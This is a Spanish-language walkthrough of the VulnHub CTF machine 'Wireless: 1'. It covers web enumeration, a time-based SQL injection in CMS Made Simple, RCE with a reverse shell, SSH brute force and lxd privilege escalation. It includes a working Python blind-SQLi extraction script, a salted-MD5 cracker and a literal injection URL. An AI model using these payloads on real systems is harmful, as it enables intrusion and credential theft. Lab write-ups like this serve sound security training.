#ctf-machine #vulnhub #medium-machine #linux [VulnhubLink](https://www.vulnhub.com/entry/wireless-1,669/)

## Enumeración inicial
Como no conocemos la dirección IP de la máquina víctima, realizamos un escaneo ARP con la herramienta `arp-scan`:
![[Pasted image 20240910182038.png]]

Como vemos la dirección IPv4 de la máquina objetiva es la "192.168.159.155", ya que el OUI de la dirección MAC es "00:0c" correspondiente a las máquinas que se importan con VMWare.

Lanzamos una traza ICMP a la máquina y como el TTL = 64, podemos decir que se trata de una máquina Linux, ya que suelen tener este valor de TTL:
![[Pasted image 20240910182236.png]]


### Nmap
Hacemos un primer escaneo con `nmap` para identificar los puertos TCP abiertos en la máquina víctima:
![[Pasted image 20240910182424.png]]

Como vemos hay 4 puertos abiertos, los puertos 22, 80, 8000 y 8080. 

Hacemos un segundo escaneo con `nmap` para detectar la versión y servicio que se ejecuta para cada uno de estos puertos:
![[Pasted image 20240910183005.png]]
![[Pasted image 20240910183100.png]]

## Enumeración web
Si lanzamos un `whatweb` para los 4 puertos HTTP, vemos lo siguiente:
![[Pasted image 20240910183316.png]]

Como vemos el puerto 80 contiene la página por defecto de Apache2. El puerto 8080 no parece contener nada y el puerto 8000 contiene una web.

Si accedemos al puerto 8000, vemos lo siguiente:
![[Pasted image 20240910183952.png]]

Como vemos la página es bastante estática pero contiene un panel de "Login", por lo que si accedemos vemos lo siguiente:
![[Pasted image 20240910184031.png]]

Si miramos el código fuente de la página vemos que hay un *script* de *JavaScript* llamado login.js que si mostramos su contenido vemos lo siguiente:
![[Pasted image 20240910185322.png]]
![[Pasted image 20240910185235.png]]

Parece ser una cadena en base 64 por lo que si la decodificamos, vemos lo siguiente:
![[Pasted image 20240910185345.png]]

Como vemos hay valores en hexadecimal por lo que utilizamos la siguiente línea para ver lo que contiene:
![[Pasted image 20240910185425.png]]

Como vemos hay 4 elementos con estos valores. Si nos fijamos en el código, la variable "u" parece ser el usuario que se lo asigna a "jinmori". Respecto a la variable "p" que podría ser la *password*, hace lo siguiente:
- Convierte a String con "fromCharCode" los caracteres de las variables (a,b,c,d,e,f,g,h,i).
- var a = carácter 0 de la frase = 'T'
- var b = carácter 36 de la frase = 'a'
- var c = carácter 2 de la frase = 'e'
- var d = carácter 8 de la frase = 'k'
- var e = carácter 13 de la frase = 'w'
- var f = carácter 12 de la frase = 'o'
- var g = carácter 14 de la frase = 'n'
- var h = carácter 40 de la frase = 'd'
- var i = carácter 12 de la frase = 'o'

Por lo que la contraseña sería "Taekwondo".

Si probamos estas credenciales, obtenemos acceso como administradores de la página:
![[Pasted image 20240910191818.png]]![[Pasted image 20240910191925.png]]

Como vemos estamos en un panel administrativo. Si accedemos al apartado de users vemos un gran conjunto de usuarios:
![[Pasted image 20240910192638.png]]

Si accedemos al panel "VOIP Logs", vemos lo siguiente:
![[Pasted image 20240910193718.png]]
![[Pasted image 20240910193822.png]]

Como vemos, son SMS codificados en PDU por lo que utilizamos un converter *online* para decodificar los mensajes:
![[Pasted image 20240910194002.png]]
![[Pasted image 20240910194050.png]]
![[Pasted image 20240910194138.png]]
![[Pasted image 20240910194206.png]]
![[Pasted image 20240910194230.png]]

Como vemos, es una conversación donde se indica que hay un dominio wireless.com, por lo que lo añadimos en el `/etc/hosts` de nuestra máquina:
![[Pasted image 20240910194842.png]]

Una vez añadido, si accedemos vemos lo siguiente:
![[Pasted image 20240910195101.png]]

Como vemos es un "CMS Made Simple" que si nos fijamos su versión es la siguiente:
![[Pasted image 20240910195132.png]]


## SQL Injection
Si buscamos con `searchsploit` sobre esta versión encontramos que hay un *SQL Injection*:
![[Pasted image 20240910195215.png]]

Más concretamente se genera un *SQL Injection* basada en tiempo en el parámetro "m1_idlist":
`http://wireless.com/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(3))--%20-`

Por lo que utilizo un *script* de Python para extraer primeramente la base de datos:
> [!NOTE] Este script de Python se encuentra en: [[#SQLI Python Script]]

![[Pasted image 20240910225138.png]]

Una vez extraídas, muestro las tablas de la base de datos "cmsmsdb":
![[Pasted image 20240911104757.png]]

Por lo que mostramos las columnas de la tabla "cms_adminlog" y "cms_users", ya que pueden ser interesantes:
![[Pasted image 20240911105845.png]]

Como vemos en la tabla "cms_users", contiene las columnas "username", "password" y "admin_access", así que extraemos sus datos:
![[Pasted image 20240911111044.png]]

Como vemos hay un usuario llamado "juniordev" con la contraseña encriptada y con acceso de administrador.

Intentamos desencriptar la contraseña con `hashcat` y el diccionario "rockyou.txt":
![[Pasted image 20240911111259.png]]

Como vemos puede ser md5 así que probamos primeramente con este modo, pero no conseguimos *crackear* la contraseña. 

Investigando un poco, nos damos cuenta de que la contraseña utiliza una *salt* por lo que la extraemos de la tabla "cms_siteprefs" en la propiedad con esta subcadena en su nombre:  "sitemask".
![[Pasted image 20240911113809.png]]
![[Pasted image 20240911123830.png]]


Utilizando un *script* de Python personalizado, utilizamos la *salt* junto al diccionario "rockyou.txt" para *crackear* la contraseña:
![[Pasted image 20240911122457.png]]
>[!NOTE] El script de Python utilizado se encuentra en: [[#Cracker Python Script]]


## RCE
Una vez extraída la contraseña accedemos al panel de administrador con las credenciales "juniordev" y "passion". Dicho panel se encuentra en:
http://wireless.com/admin/login.php
![[Pasted image 20240911124302.png]]

Una vez dentro, podemos obtener RCE accediendo a las "User Defined Tags" de las "Extensions":
![[Pasted image 20240911124400.png]]

Añadimos una nueva "User Defined Tag":
![[Pasted image 20240911124503.png]]

Y añadimos el siguiente código:
![[Pasted image 20240911124602.png]]

Una vez creada la *tag*, le damos a "Run" mientras estamos en escucha con `nc` por el puerto 443:
![[Pasted image 20240911124725.png]]
![[Pasted image 20240911124751.png]]

Y como vemos obtenemos la *reverse shell* por lo que hacemos el tratamiento de la TTY:
![[Pasted image 20240911124941.png]]
![[Pasted image 20240911125018.png]]

## Escalada de privilegios
Si seguimos enumerando la máquina, nos daremos cuenta de que si accedemos al puerto 8080, con el subdominio "wireless.com", podemos acceder a un portal interno:
![[Pasted image 20240911133548.png]]


Si hacemos une escaneo con `gobuster` en busca de subdominios, encontramos el siguiente:
![[Pasted image 20240911133748.png]]

Por lo que si accedemos, nos aparece un panel de autentificación:
![[Pasted image 20240911134843.png]]

Así que probamos con las credenciales que ya tenemos y vemos que con "juniordev" y "passion" obtenemos acceso:
![[Pasted image 20240911134947.png]]

Si introducimos "help" y posteriormente "Tools", aparece lo siguiente:
![[Pasted image 20240911135708.png]]

Como vemos, podemos lanzar un `Aircrack-ng` y obtenemos una captura del *handshake* y la siguiente información:
![[Pasted image 20240911145957.png]]

Con dicha captura, podemos utilizar la herramienta `aircrack-ng` para intentar *crackear* la contraseña de la *red*, pero no es posible *crackearla*.

Si ahora ejecutamos el comando "Logs" en la web, vemos lo siguiente:
![[Pasted image 20240911151015.png]]

Si nos descargamos este recurso, vemos mucho texto e información. Así que podemos crear un diccionario con `cewl` para posteriormente probar fuerza bruta de SSH con el usuario existente en la máquina (hay que ser creativos para hackear esta máquina 🤡):
![[Pasted image 20240911151324.png]]
![[Pasted image 20240911151424.png]]

Como vemos se genera un diccionario de 1093 contraseñas. Por lo que utilizamos `hydra` para hacer fuerza bruta con dicho diccionario:
![[Pasted image 20240911155834.png]]

Una vez ya sabemos la contraseña, accedemos por SSH y podemos visualizar la primera *flag*:
![[Pasted image 20240911155857.png]]

Si listamos los grupos del usuario "coherer" vemos que está en el grupo "lxd" por lo que podemos escalar privilegios fácilmente. 
![[Pasted image 20240911155933.png]]

Primeramente, nos clonamos en nuestra máquina el siguiente repositorio e instalamos la imagen de "build-alpine":
![[Pasted image 20240911153516.png]]

Una vez creada la transferimos a la máquina víctima con Python:
![[Pasted image 20240911153642.png]]
![[Pasted image 20240911160232.png]]

Una vez transferido a la máquina víctima, importamos la imagen y creamos un contenedor con la raíz del sistema en el directorio `/mnt` del contenedor:
![[Pasted image 20240911160704.png]]
![[Pasted image 20240911160808.png]]
![[Pasted image 20240911160955.png]]
![[Pasted image 20240911161137.png]]

Una vez añadido el permiso SUID a la "bash" de la máquina víctima desde el contenedor, podemos ejecutar en la máquina víctima el comando `bash -p` y obtener una "bash" como *root*:
![[Pasted image 20240911161253.png]]

Por lo que si accedemos a `/root` podemos visualizar la última *flag*:
![[Pasted image 20240911161328.png]]


## SQLI Python Script
```python
from pwn import *
import requests
import string
import sys, signal
import argparse
import time
import urllib.parse

TIME = None


def sig_handler(sig, frame):
    print("\n\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

def get_params():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--database", help="Database name")
    parser.add_argument("-t", "--table", help="Table name")    
    parser.add_argument("-c", "--column", help="Column name")
    parser.add_argument("-T", "--TIME", help="Time to sleep", default=2)
    # add extract salt option
    parser.add_argument("-s", "--salt", help="Extract salt", action="store_true")
    args = parser.parse_args()
    
    database = args.database
    table = args.table
    column = args.column
    salt = args.salt
    global TIME
    TIME = float(args.TIME)

    return database, table, column, salt

URL = "http://wireless.com/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5"


def get_databases():
    characters = string.printable
    p1 = log.progress("Getting databases")
    p2 = log.progress("Trying with")
    databases = ""

    for pos in range(1, 1000):
        for char in characters:
            p2.status(char)
            payload = f")) and ((select ascii(substring(group_concat(schema_name),{pos})) from information_schema.schemata)={ord(char)}) and (select sleep({TIME}))-- -"
            payload = urllib.parse.quote(payload)
            actual_time = time.time()
            r = requests.get(URL + payload)
            if time.time() - actual_time > TIME:
                databases += char
                p1.status(databases)
                break

            if char == characters[-1]:
                p2.success("Databases found")
                return databases


def get_tables(database):
    characters = string.printable
    p1 = log.progress("Getting tables")
    p2 = log.progress("Trying with")
    tables = ""
    database = database.encode('utf-8').hex()

    for pos in range(1, 1000):
        for char in characters:
            p2.status(char)
            payload = f")) and ((select ascii(substring(group_concat(table_name),{pos})) from information_schema.tables where table_schema = 0x{database})={ord(char)}) and (select sleep({TIME}))-- -"
            payload = urllib.parse.quote(payload)
            actual_time = time.time()
            r = requests.get(URL + payload)
            if time.time() - actual_time > TIME:
                tables += char
                p1.status(tables)
                break

            if char == characters[-1]:
                p2.success("Tables found")
                return tables

def get_columns(database, table):
    characters = string.printable
    p1 = log.progress("Getting columns")
    p2 = log.progress("Trying with")
    columns = ""
    database = database.encode('utf-8').hex()
    table = table.encode('utf-8').hex()

    for pos in range(1, 1000):
        for char in characters:
            p2.status(char)
            payload = f")) and ((select ascii(substring(group_concat(column_name),{pos})) from information_schema.columns where table_schema = 0x{database} and table_name = 0x{table})={ord(char)}) and (select sleep({TIME}))-- -"
            payload = urllib.parse.quote(payload)
            actual_time = time.time()
            r = requests.get(URL + payload)
            if time.time() - actual_time > TIME:
                columns += char
                p1.status(columns)
                break

            if char == characters[-1]:
                p2.success("Columns found")
                return columns

def get_data(database, table, column):
    characters = string.printable
    p1 = log.progress("Getting data")
    p2 = log.progress("Trying with")
    data = ""

    for pos in range(1, 1000):
        for char in characters:
            p2.status(char)
            payload = f")) and ((select ascii(substring(group_concat({column}),{pos})) from {database}.{table})={ord(char)}) and (select sleep({TIME}))-- -"
            payload = urllib.parse.quote(payload)
            actual_time = time.time()
            r = requests.get(URL + payload)
            if time.time() - actual_time > TIME:
                data += char
                p1.status(data)
                break

            if char == characters[-1]:
                p2.success("Data found")
                return data


def get_salt():
    characters = string.printable
    p1 = log.progress("Getting salt")
    p2 = log.progress("Trying with")
    data = ""

    for pos in range(1, 1000):
        for char in characters:
            p2.status(char)
            payload = f")) and ((select ascii(substring(group_concat(sitepref_value),{pos})) from cmsmsdb.cms_siteprefs where sitepref_name like 0x736974656d61736b)={ord(char)}) and (select sleep({TIME}))-- -"
            payload = urllib.parse.quote(payload)
            actual_time = time.time()
            r = requests.get(URL + payload)
            if time.time() - actual_time > TIME:
                data += char
                p1.status(data)
                break

            if char == characters[-1]:
                p2.success("Data found")
                return data


if __name__ == '__main__':
    database, table, column, salt = get_params()
    
    if salt != None:
        get_salt()

    elif database == None:
        get_databases()
    
    elif table == None:
        get_tables(database)
    
    elif column == None:
        get_columns(database, table)
    
    else:
        get_data(database, table, column)

```


## Cracker Python Script
```python
from pwn import *
import hashlib
import sys
import signal

def sig_handler(sig, frame):
    print("\n\n[!]Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

wordlist = None
salt = "551c92a536111490"
hash = "a25bb9e6782e7329c236d2538dd4f5ac"

with open("/usr/share/wordlists/rockyou.txt", 'rb') as f:
    wordlist = f.read().splitlines()

p1 = log.progress("Cracking Password")

for i, word in enumerate(wordlist):
    p1.status(f"{i/len(wordlist)*100:.2f}%")
    word = word.decode('utf-8').strip()
    if hashlib.md5((str(salt) + word).encode()).hexdigest() == hash:
        print("Password is: ", word)
        sys.exit(0)
```


___
#information-leakage #sqli #abusing-internal-services #password-brute-force #abusing-special-user-groups #web-enumeration #hacking-wifi
___
